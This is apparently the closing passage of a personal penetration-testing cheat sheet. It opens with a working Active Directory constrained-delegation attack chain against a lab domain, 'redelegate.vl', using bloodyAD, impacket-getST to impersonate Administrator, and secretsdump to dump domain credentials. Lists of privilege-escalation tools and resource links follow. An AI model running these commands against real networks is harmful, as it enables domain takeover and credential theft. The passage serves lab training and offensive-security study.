bloodyAD -d redelegate.vl -u HELEN.FROST -p '0xdf0xdf!'  --host "dc.redelegate.vl" set object FS01$ msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'

# use FS01$ to req KDC give a service ticket (TGS) to access cifs/dc.redelegate.vl  but impersonate user ( or machine)  such as Administrator or DC$  ( have file Administrator.ccache)
impacket-getST 'redelegate.vl/FS01$:NewPassword123!' -spn cifs/dc.redelegate.vl -impersonate Administrator

#  DCSync to dump DC 
KRB5CCNAME=Administrator.ccache  impacket-secretsdump -k dc.redelegate.vl


```
## Useful Script To Local Windows Privilege Escalation
```
https://github.com/GhostPack/Seatbelt

https://github.com/411Hall/JAWS

https://github.com/peass-ng/PEASS-ng

```
## Useful Resources To Local Windows Privilege Escalation
```

https://lolbas-project.github.io/#

https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

```
## Useful Script To Linux Privilege Escalation
```

https://github.com/rebootuser/LinEnum

https://github.com/sleventyeleven/linuxprivchecker

https://github.com/peass-ng/PEASS-ng

```
## Useful Resources To Linux Privilege Escalation
```
https://gtfobins.github.io/

https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md


```
## Useful Resources 

[HackTriks](https://book.hacktricks.xyz/)

[WADCOMS](https://wadcoms.github.io/#+SMB+Windows)

[GTFOBins](https://gtfobins.github.io/)

[SwissKeyRepo - Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Living Of The Land Binaries and Scripts for Windows](https://lolbas-project.github.io/#)

[Active Directory MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/)

[Precompiled .NET Binaries](https://github.com/jakobfriedl/precompiled-binaries) 

[BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
